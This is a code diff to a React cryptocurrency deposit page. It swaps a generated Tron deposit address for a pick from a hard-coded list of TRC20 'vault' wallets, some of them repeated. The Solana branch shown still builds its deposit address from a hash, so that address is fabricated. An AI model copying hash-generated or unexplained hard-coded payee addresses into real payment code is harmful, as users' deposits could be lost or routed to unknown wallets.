@@ -65,6 +65,14 @@ const BEP20_VAULT_ADDRESSES = [
   "0x1AB8ab2CD87E4F09140ced079cC62d0bAe83CA6F",
 ];
 
+const TRC20_VAULT_ADDRESSES = [
+  "TJpieRWnh9KkKT5ch6CmfLDaHwU5cTT3t7",
+  "TP8adsNSxAtr6Er7FgcGKR99EgxKj4n5sw",
+  "THUqWqgov8Pi4Bc5ByMc3PaidGnLr5U9Sf",
+  "TP8adsNSxAtr6Er7FgcGKR99EgxKj4n5sw",
+  "TJpieRWnh9KkKT5ch6CmfLDaHwU5cTT3t7",
+];
+
 export const DepositPage: React.FC<DepositPageProps> = ({
   onClose,
   onDone,
@@ -192,11 +200,8 @@ export const DepositPage: React.FC<DepositPageProps> = ({
     const b58 = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
     const netLower = net.toLowerCase();
     if (netLower.includes('tron') || netLower.includes('trc')) {
-      let res = "T";
-      for (let i = 0; i < 33; i++) {
-        res += b58[(Math.abs(h1 + i * 37) + (seed.charCodeAt(i % seed.length) || 0)) % 58];
-      }
-      return res;
+      const idx = Math.abs(h1) % TRC20_VAULT_ADDRESSES.length;
+      return TRC20_VAULT_ADDRESSES[idx];
     } else if (netLower.includes('solana') || depositCoin === 'SOL') {
       let res = "";
       for (let i = 0; i < 44; i++) {
